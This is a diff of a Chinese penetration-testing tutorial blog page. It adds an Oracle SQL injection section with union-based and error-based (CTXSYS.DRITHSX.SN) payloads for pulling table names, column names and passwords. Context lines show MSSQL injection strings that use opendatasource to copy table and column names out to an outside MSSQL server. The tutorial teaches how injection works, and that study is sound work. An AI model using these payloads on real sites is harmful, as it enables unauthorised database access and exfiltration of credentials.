@@ -635,14 +635,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        7.4k
+                        7.9k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        27 分
+                        30 分
                     </div>
                     
                 
@@ -1089,21 +1089,78 @@ select admin.*,8,9,10 from admin    #可以获得d,e,f</code></pre><p>偏移注�
 <p>这样我们就得到了我们自己的数据库地址、数据库名、用户名、密码</p>
 <p>2.然后我们需要用Navicat连接我们的数据库，黄色代表连接成功</p>
 <h3 id="实战演练"><a href="#实战演练" class="headerlink" title="实战演练"></a>实战演练</h3><h4 id="判断是否只存在注入"><a href="#判断是否只存在注入" class="headerlink" title="判断是否只存在注入"></a>判断是否只存在注入</h4><p>用and 1=1 – qwe和and 1=2 – qwe</p>
-<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/26/shen-tou-ce-shi-zong-jie/H:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%BB%E7%BB%93%5CMSSQL1.png" alt="MSSQL1"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/26/shen-tou-ce-shi-zong-jie/MSSQL1.png" alt="MSSQL1"></p>
 <p>显示正常</p>
-<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/26/shen-tou-ce-shi-zong-jie/H:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%BB%E7%BB%93%5CMSSQL2.png" alt="MSSQL2"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/26/shen-tou-ce-shi-zong-jie/MSSQL2.png" alt="MSSQL2"></p>
 <p>显示不正常</p>
 <h4 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h4><pre><code>' order by 1 -- qwe            #显示正常
 ' order by 2 -- qwe            #显示正常
 ' order by 3 -- qwe            #显示正常
 ' order by 4 -- qwe            #报错</code></pre><p>判断出来有三个字段获取id和表名</p>
 <h4 id="获取id和表名"><a href="#获取id和表名" class="headerlink" title="获取id和表名"></a>获取id和表名</h4><pre><code>'; insert into opendatasource('sqloledb','server=den1.mssql8.gear.host,1433;uid=samedi;pwd=xxxxxxxxxx;database=samedi').samedi.dbo.object select id,name from sysobjects where xtype='U' --+</code></pre><p>注入上面的语句我们就可以获得表名</p>
-<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/26/shen-tou-ce-shi-zong-jie/H:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%BB%E7%BB%93%5CMSSQL3.png" alt="MSSQL3"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/26/shen-tou-ce-shi-zong-jie/MSSQL3.png" alt="MSSQL3"></p>
 <p>admin表对应的id为“1977058079”</p>
 <h4 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h4><pre><code>'; insert into opendatasource('sqloledb','server=den1.mssql8.gear.host,1433;uid=samedi;pwd=xxxxxxxxxxx;database=samedi').samedi.dbo.columns select name from syscolumns where id=1977058079 --+</code></pre><p>通过id,我们可以找到admin表对应的字段，创建另一个只有一个字段的表columns，当然，也可以用之前的那个表。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/26/shen-tou-ce-shi-zong-jie/H:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%BB%E7%BB%93%5CMSSQL4.png" alt="MSSQL4"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/26/shen-tou-ce-shi-zong-jie/MSSQL4.png" alt="MSSQL4"></p>
 <p>之后获取字段中的数据也是轻而易举的了，因为知道了有4个字段，所以我们在自己的数据库中创建一个有4个字段的表</p>
-<pre><code>select *from admin --+</code></pre><script>
+<pre><code>select *from admin --+</code></pre><h2 id="Oracle注入——报错注入"><a href="#Oracle注入——报错注入" class="headerlink" title="Oracle注入——报错注入"></a>Oracle注入——报错注入</h2><p>MySQL中的报错注入使用的函数是updatexml()</p>
+<p>Oracle数据库中存在虚表/实表，Oracle弱化了库的概念，强化了用户的概念，用户就是库</p>
+<h3 id="系统自带库"><a href="#系统自带库" class="headerlink" title="系统自带库"></a>系统自带库</h3><pre><code>select * from all_tables                #列出所有表
+select * from user_tables                #查询出当前用户的表
+select * from all_tab_columns            #查询出所有字段
+select * from user_tab_coulumns            #查询出当前用户的字段
+select * from v$version                    #查版本</code></pre><h3 id="limit的使用"><a href="#limit的使用" class="headerlink" title="limit的使用"></a>limit的使用</h3><p>Oracle用的是rownum=1：限制查询返回的总行数为一条，且大于1时，只能用小于号，例：</p>
+<pre><code>select * from admin where rownum=1        #一条数据
+select * from admin where rownum&lt;3        #两条数据</code></pre><p>select rownum,UNAME from admin</p>
+<table>
+<thead>
+<tr>
+<th>ROWNUM</th>
+<th>UNAME</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>admin</td>
+</tr>
+<tr>
+<td>2</td>
+<td>root</td>
+</tr>
+</tbody></table>
+<h3 id="Oracle显错注入"><a href="#Oracle显错注入" class="headerlink" title="Oracle显错注入"></a>Oracle显错注入</h3><pre><code>and 1=1
+
+and 1=2
+
+order by 1
+
+·
+
+·
+union select null,null,null from  dual
+我们是需要知道null的字段类型，从而来代替null的，这里假如知道
+
+union select 1,null,to_nchar('a') from dual
+这里需要将union前面的语句显示不出来，比如说将id字段输入一个不存在的数字，例：1000
+
+id=1000 union all select 1,null,to_nchar('table_name') from user_tables
+查出来表名为xxx
+
+id=1000 union all select 1,null,to_nchar('table_name') from user_tables where table_name&lt;&gt;'xxx'
+这句相当于将xxx排除，因此可以得到其他表名，例：ADMIN
+还想获得下一个表名就在这句后面加上and table_name&lt;&gt;'ADMIN'
+
+select username from (select rownum r,username from all_users) where r=1
+r相当于rownum的别名，r=2就是第2条数据
+
+select column_name from(select rownum r,column_name from user_tab_columns) where r=1
+
+id=1000 union all select 1,null,to_nchar(column_name) from (select rownum r,column_name from user_tab_columns where table_name='ADMIN') where r=1
+
+select 1,null,to_char(UPASS) from (select rownum r,UPASS from admin) where r=1</code></pre><h3 id="Oracle报错注入"><a href="#Oracle报错注入" class="headerlink" title="Oracle报错注入"></a>Oracle报错注入</h3><p>CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1))</p>
+<p>：去查询关于主题的对应关键词，然后因为查询失败（应该是这个用户没有创建和查询的权限，默认情况没有创建，爆出未查询到的错误，从而爆出查询内容）</p>
+<pre><code>id=1000 and 1=CTXSYS.DRITHSX.SN(1,(select table_name from user_tables where rownum=1))</code></pre><p>报错不需要union，之后的跟显错注入是一样的。</p>
+<script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -1849,7 +1906,7 @@ select admin.*,8,9,10 from admin    #可以获得d,e,f</code></pre><p>偏移注�
 
             
                 &nbsp; | &nbsp;字数统计:&nbsp;
-                <span class="white-color">7.5k</span> 字
+                <span class="white-color">8k</span> 字
             
 
             
